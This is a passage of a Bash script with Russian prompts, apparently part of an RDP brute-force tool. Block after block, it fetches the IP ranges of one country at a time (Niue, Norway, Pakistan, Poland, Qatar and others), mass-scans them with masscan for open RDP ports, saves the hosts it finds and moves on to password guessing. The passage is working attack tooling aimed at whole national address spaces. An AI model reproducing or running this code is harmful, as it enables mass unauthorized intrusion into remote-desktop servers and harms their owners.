echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "136" ]; then
curl http://services.ce3c.be/ciprg/?countrys=NIUE |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Niue://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "137" ]; then
curl http://services.ce3c.be/ciprg/?countrys=NON-SPEC+ASIA+PAS+LOCATION |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Non-spec Asia Pas Location://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "138" ]; then
curl http://services.ce3c.be/ciprg/?countrys=NORFOLK+ISLAND|grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Norfolk Island://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "139" ]; then
curl http://services.ce3c.be/ciprg/?countrys=NORTHERN+MARIANA+ISLANDS|grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Northern Mariana Islands://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "140" ]; then
curl http://services.ce3c.be/ciprg/?countrys=NORWAY |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Norway://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "141" ]; then
curl http://services.ce3c.be/ciprg/?countrys=OMAN |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/OMAN://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU
else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "142" ]; then
curl http://services.ce3c.be/ciprg/?countrys=PAKISTAN |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Pakistan://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "143" ]; then
curl http://services.ce3c.be/ciprg/?countrys=PALAU |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Palau://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU

else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "144" ]; then
curl http://services.ce3c.be/ciprg/?countrys=PALESTINIAN+TERRITORY+OCCUPIED|grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Palestinian Territory Occupied://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "145" ]; then
curl http://services.ce3c.be/ciprg/?countrys=PANAMA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Panama://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "146" ]; then
curl http://services.ce3c.be/ciprg/?countrys=PAPUA+NEW+GUINEA|grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Papua New Guinea://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "147" ]; then
curl http://services.ce3c.be/ciprg/?countrys=PARAGUAY |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Paraguay://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "148" ]; then
curl http://services.ce3c.be/ciprg/?countrys=PERU |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Peru://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "149" ]; then
curl http://services.ce3c.be/ciprg/?countrys=PHILIPPINES |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Philippines://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "150" ]; then
curl http://services.ce3c.be/ciprg/?countrys=POLAND |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Poland://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "151" ]; then
curl http://services.ce3c.be/ciprg/?countrys=PORTUGAL |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Portugal://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "152" ]; then
curl http://services.ce3c.be/ciprg/?countrys=PUERTO+RICO |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Puerto Rico://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "153" ]; then
curl http://services.ce3c.be/ciprg/?countrys=QATAR |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Qatar://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
